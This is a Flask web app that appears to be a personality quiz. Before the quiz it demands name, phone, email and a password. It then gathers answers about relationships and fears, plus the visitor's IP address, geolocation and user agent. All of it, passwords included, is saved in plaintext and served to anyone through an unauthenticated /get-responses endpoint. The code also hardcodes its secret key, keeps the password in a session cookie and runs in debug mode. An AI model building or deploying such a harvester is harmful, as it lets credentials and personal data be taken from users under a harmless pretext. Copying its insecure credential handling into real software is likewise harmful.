from flask import Flask, request, render_template, redirect, url_for, session, jsonify
import requests
import os
import json

app = Flask(__name__)
app.secret_key = 'very_secret_key'  # для хранения сессии

RESPONSES_FILE = 'responses.json'

def save_response(data):
    if os.path.exists(RESPONSES_FILE):
        with open(RESPONSES_FILE, 'r', encoding='utf-8') as f:
            responses = json.load(f)
    else:
        responses = []

    responses.append(data)

    with open(RESPONSES_FILE, 'w', encoding='utf-8') as f:
        json.dump(responses, f, ensure_ascii=False, indent=4)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        session['name'] = request.form.get('name')
        session['phone'] = request.form.get('phone')
        session['email'] = request.form.get('email')
        session['password'] = request.form.get('password')

        if not all([session['name'], session['phone'], session['email'], session['password']]):
            return "Пожалуйста, заполните все поля", 400

        return redirect(url_for('questions'))
    return render_template('index.html')

@app.route('/questions', methods=['GET', 'POST'])
def questions():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ua = request.headers.get('User-Agent')

        try:
            geo = requests.get(f'https://ipapi.co/{ip}/json/').json()
        except:
            geo = {}

        answers = {
            'Цветы': request.form.get('flowers'),
            'Отношения': request.form.get('relationships'),
            'Хобби': request.form.get('hobbies'),
            'Работа мечты': request.form.get('dream_job'),
            'Любимая еда': request.form.get('fav_food'),
            'Музыка': request.form.get('music'),
            'Путешествия': request.form.get('travel'),
            'Страхи': request.form.get('fears'),
        }

        full_data = {
            'name': session['name'],
            'phone': session['phone'],
            'email': session['email'],
            'password': session['password'],
            'answers': answers,
            'ip': ip,
            'location': {
                'city': geo.get('city'),
                'country': geo.get('country_name'),
            },
            'user_agent': ua
        }

        save_response(full_data)

        return render_template('success.html', name=session['name'], answers=answers, geo=geo, ip=ip, ua=ua)

    return render_template('questions.html')

@app.route('/get-responses')
def get_responses():
    if os.path.exists(RESPONSES_FILE):
        with open(RESPONSES_FILE, 'r', encoding='utf-8') as f:
            responses = json.load(f)
        return jsonify(responses)
    else:
        return jsonify([])

if __name__ == '__main__':
    app.run(debug=True)

